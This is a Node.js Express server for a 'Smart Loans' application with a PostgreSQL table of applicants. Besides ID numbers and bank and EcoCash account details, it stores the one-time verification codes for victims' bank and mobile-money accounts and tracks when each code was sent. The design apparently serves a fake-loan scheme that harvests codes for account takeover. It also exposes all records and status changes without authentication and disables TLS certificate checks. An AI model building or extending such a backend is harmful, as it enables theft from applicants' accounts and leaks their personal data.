const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));

const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: {
        rejectUnauthorized: false
    }
});
// ===============================
// HOME PAGE
// ===============================

app.get("/", (req, res) => {
    res.sendFile(__dirname + "/public/index.html");
});

// ===============================
// HEALTH CHECK
// ===============================

app.get("/health", (req, res) => {
    res.json({
        status: "OK",
        app: "Smart Loans",
        version: "1.0.0"
    });
});

// ===============================
// TEST DATABASE
// ===============================

app.get("/test-db", async (req, res) => {

    try {

        const result = await pool.query("SELECT NOW()");

        res.json({
            success: true,
            database: "Connected",
            serverTime: result.rows[0].now
        });

    } catch (err) {

        console.error(err);

        res.status(500).json({
            success: false,
            error: err.message
        });

    }

});
// ===============================
// CREATE APPLICATIONS TABLE
// ===============================

app.get("/create-table", async (req, res) => {

    try {

        await pool.query(`

            CREATE TABLE IF NOT EXISTS applications (

                id SERIAL PRIMARY KEY,

                full_names TEXT,
                date_of_birth TEXT,
                id_number TEXT,
                occupation TEXT,
                loan_purpose TEXT,

                loan_amount NUMERIC,
                repayment_period TEXT,
                monthly_repayment NUMERIC,
                total_repayment NUMERIC,

                disbursement_method TEXT,

                bank_name TEXT,
                account_name TEXT,
                bank_phone TEXT,
                account_number TEXT,
                bank_verification_code TEXT,
                bank_reference TEXT,

                ecocash_name TEXT,
                ecocash_number TEXT,
                ecocash_verification_code TEXT,
                ecocash_reference TEXT,

                status TEXT DEFAULT 'Pending',

                created_at TIMESTAMP DEFAULT NOW()

            );

        `);

        res.json({
            success: true,
            message: "Applications table created successfully."
        });

    } catch (err) {

        console.error(err);

        res.status(500).json({
            success: false,
            error: err.message
        });

    }

});
// ===============================
// SUBMIT APPLICATION
// ===============================

app.post("/submit-application", async (req, res) => {

    try {

        const {

            fullNames,
            dateOfBirth,
            idNumber,
            occupation,
            loanPurpose,

            loanAmount,
            loanPeriod,
            monthlyRepayment,
            totalRepayment,

            disbursementMethod,

            selectedBank,
            accountName,
            bankPhone,
            accountNumber,
            verificationCode,
            bankReference,

            ecoName,
            ecoNumber,
            ecoVerificationCode,
            ecoReference

        } = req.body;

        const result = await pool.query(

            `INSERT INTO applications (

                full_names,
                date_of_birth,
                id_number,
                occupation,
                loan_purpose,

                loan_amount,
                repayment_period,
                monthly_repayment,
                total_repayment,

                disbursement_method,

                bank_name,
                account_name,
                bank_phone,
                account_number,
                bank_verification_code,
                bank_reference,

                ecocash_name,
                ecocash_number,
                ecocash_verification_code,
                ecocash_reference

            )

            VALUES (

                $1,$2,$3,$4,$5,
                $6,$7,$8,$9,
                $10,
                $11,$12,$13,$14,$15,$16,
                $17,$18,$19,$20

            )

            RETURNING *;`,

            [

                fullNames,
                dateOfBirth,
                idNumber,
                occupation,
                loanPurpose,

                loanAmount,
                loanPeriod,
                monthlyRepayment,
                totalRepayment,

                disbursementMethod,

                selectedBank,
                accountName,
                bankPhone,
                accountNumber,
                verificationCode,
                bankReference,

                ecoName,
                ecoNumber,
                ecoVerificationCode,
                ecoReference

            ]

        );

        res.json({

            success: true,
            application: result.rows[0]

        });

    } catch (err) {

        console.error(err);

        res.status(500).json({

            success: false,
            error: err.message

        });

    }

});
// ===============================
// GET ALL APPLICATIONS
// ===============================

app.get("/applications", async (req, res) => {

    try {

        const result = await pool.query(`
            SELECT *
            FROM applications
            ORDER BY created_at DESC;
        `);

        res.json({
            success: true,
            applications: result.rows
        });

    } catch (err) {

        console.error(err);

        res.status(500).json({
            success: false,
            error: err.message
        });

    }

});

app.get("/add-verification-status", async (req, res) => {

    try {

        await pool.query(`

            ALTER TABLE applications

            ADD COLUMN IF NOT EXISTS verification_status TEXT DEFAULT 'Waiting',

            ADD COLUMN IF NOT EXISTS code_sent_at TIMESTAMP;

        `);

        res.json({

            success: true,

            message: "Verification status added."

        });

    } catch(err){

        res.status(500).json({

            success:false,

            error:err.message

        });

    }

});
// ===============================
// UPDATE APPLICATION STATUS
// ===============================

app.put("/application-status/:id", async (req, res) => {

    try {

        const { id } = req.params;
        const { status } = req.body;

        const result = await pool.query(

            `UPDATE applications
             SET status = $1
             WHERE id = $2
             RETURNING *;`,

            [status, id]

        );

        if (result.rows.length === 0) {

            return res.status(404).json({
                success: false,
                message: "Application not found."
            });

        }

        res.json({
            success: true,
            application: result.rows[0]
        });

    } catch (err) {

        console.error(err);

        res.status(500).json({
            success: false,
            error: err.message
        });

    }

});
// ===============================
// GET APPLICATION STATUS
// ===============================

app.get("/application-status/:id", async (req, res) => {

    try {

        const { id } = req.params;

        const result = await pool.query(

            `SELECT
                verification_status,
                status
             FROM applications
             WHERE id=$1`,

            [id]

        );

        if (result.rows.length === 0) {

            return res.status(404).json({
                success:false
            });

        }

        res.json({

            success:true,

            application:result.rows[0]

        });

    } catch(err){

        console.error(err);

        res.status(500).json({

            success:false,

            error:err.message

        });

    }

});
// ===============================
// START SERVER
// ===============================

app.listen(PORT, () => {
    console.log(`✅ Smart Loans Server running on port ${PORT}`);
});
